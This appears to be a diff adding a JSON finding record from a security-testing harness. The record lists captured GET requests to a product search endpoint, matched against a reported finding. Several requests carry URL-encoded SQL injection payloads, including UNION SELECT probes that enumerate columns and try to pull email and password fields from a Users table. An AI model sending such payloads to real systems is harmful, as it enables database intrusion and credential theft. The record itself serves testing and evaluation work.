@@ -1,0 +1,111 @@
+{
+  "finding_id": "2",
+  "artex_bound": [],
+  "snare_matched": [
+    {
+      "line": 9,
+      "time": "2026-11-19T19:37:43.08644697Z",
+      "method": "GET",
+      "path": "/rest/products/search",
+      "query": "q=apple",
+      "status": 200
+    },
+    {
+      "line": 11,
+      "time": "2026-11-19T19:37:44.681478471Z",
+      "method": "GET",
+      "path": "/rest/products/search",
+      "query": "q=%27%29%29--",
+      "status": 200
+    },
+    {
+      "line": 15,
+      "time": "2026-11-19T19:37:50.539028335Z",
+      "method": "GET",
+      "path": "/rest/products/search",
+      "query": "q=apple",
+      "status": 200
+    },
+    {
+      "line": 16,
+      "time": "2026-11-19T19:37:50.550250626Z",
+      "method": "GET",
+      "path": "/rest/products/search",
+      "query": "q=%27%29%29--",
+      "status": 200
+    },
+    {
+      "line": 26,
+      "time": "2026-11-19T19:37:53.105198127Z",
+      "method": "GET",
+      "path": "/rest/products/search",
+      "query": "q=%27%29%29+UNION+SELECT+id%2cemail%2cpassword%2c%27x%27%2c%27x%27%2c%27x%27%2c%27x%27%2c%27x%27%2c%27x%27+FROM+Users--",
+      "status": 500
+    },
+    {
+      "line": 33,
+      "time": "2026-11-19T19:37:55.993429795Z",
+      "method": "GET",
+      "path": "/rest/products/search",
+      "query": "q=%27%29%29+UNION+SELECT+NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL--",
+      "status": 500
+    },
+    {
+      "line": 34,
+      "time": "2026-11-19T19:37:56.721602546Z",
+      "method": "GET",
+      "path": "/rest/products/search",
+      "query": "q=%27%29%29+UNION+SELECT+NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL--",
+      "status": 500
+    },
+    {
+      "line": 36,
+      "time": "2026-11-19T19:37:57.456297129Z",
+      "method": "GET",
+      "path": "/rest/products/search",
+      "query": "q=%27%29%29+UNION+SELECT+NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL--",
+      "status": 500
+    },
+    {
+      "line": 38,
+      "time": "2026-11-19T19:37:58.182964505Z",
+      "method": "GET",
+      "path": "/rest/products/search",
+      "query": "q=%27%29%29+UNION+SELECT+NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL--",
+      "status": 500
+    },
+    {
+      "line": 41,
+      "time": "2026-11-19T19:37:58.903252213Z",
+      "method": "GET",
+      "path": "/rest/products/search",
+      "query": "q=%27%29%29+UNION+SELECT+NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL--",
+      "status": 500
+    },
+    {
+      "line": 56,
+      "time": "2026-11-19T19:38:17.275908375Z",
+      "method": "GET",
+      "path": "/rest/products/search",
+      "query": "q=%27%29%29+UNION+SELECT+1%2c%27a%27%2c%27a%27%2c1%2c1%2c%27a%27%2c%27a%27%2c%27a%27%2c%27a%27%2c%27a%27--",
+      "status": 500
+    },
+    {
+      "line": 57,
+      "time": "2026-11-19T19:38:18.093755Z",
+      "method": "GET",
+      "path": "/rest/products/search",
+      "query": "q=%27%29%29+UNION+SELECT+1%2cemail%2cpassword%2c%27a%27%2c%27a%27%2c%27a%27%2c%27a%27%2c%27a%27%2c%27a%27%2c%27a%27--",
+      "status": 500
+    },
+    {
+      "line": 62,
+      "time": "2026-11-19T19:38:27.317039171Z",
+      "method": "GET",
+      "path": "/rest/products/search",
+      "query": "q=",
+      "status": 200
+    }
+  ],
+  "snare_match_rule": "a request line in the finding's evidence, summary or name (METHOD /path or METHOD http://host/path) with the same method and path as the captured request"
+}
